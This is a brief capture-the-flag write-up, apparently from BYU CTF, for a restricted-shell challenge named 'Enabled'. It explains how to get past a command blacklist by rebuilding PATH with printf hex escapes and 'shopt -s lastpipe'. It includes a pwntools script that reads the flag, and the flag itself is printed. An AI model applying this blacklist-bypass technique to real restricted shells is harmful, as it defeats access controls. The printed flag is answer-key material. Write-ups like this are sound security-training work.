---
ai_date: 2025-05-17 21:38:39
ai_summary: Bypassed blacklist using printf and read to set PATH, then exploited with shopt -s lastpipe and cat flag
ai_tags:
  - shell
  - cmd-injection
  - path-traversal
created: 2025-05-17T04:45
points: 436
solves: 96
title: Enabled
updated: 2025-05-17T21:52
---

Well we can use `printf` to bypass the blacklist.

Let's then try refilling the PATH variable with `read`.

```bash
printf '\\x2fbin:\\x2fusr\\x2fbin'|read PATH
set
```

Well it didn't work, `PATH` is empty.

I looked online and apparently there is this command `shopt -s lastpipe` that allows the last command in a pipeline to run in the current shell.

So it would actually set the `PATH` variable.

```python
from pwn import *
r = remote("enabled.chal.cyberjousting.com", 1352)
r.sendline(b"shopt -s lastpipe")
r.sendline(b"printf '\\\\x2fbin:\\\\x2fusr\\\\x2fbin'|read PATH")
r.sendline(b"bash")
r.sendline(b"cat /flag/flag.txt")
print(r.recvall(timeout=1).decode())
```

```flag
byuctf{enable_can_do_some_funky_stuff_huh?_488h33d}
```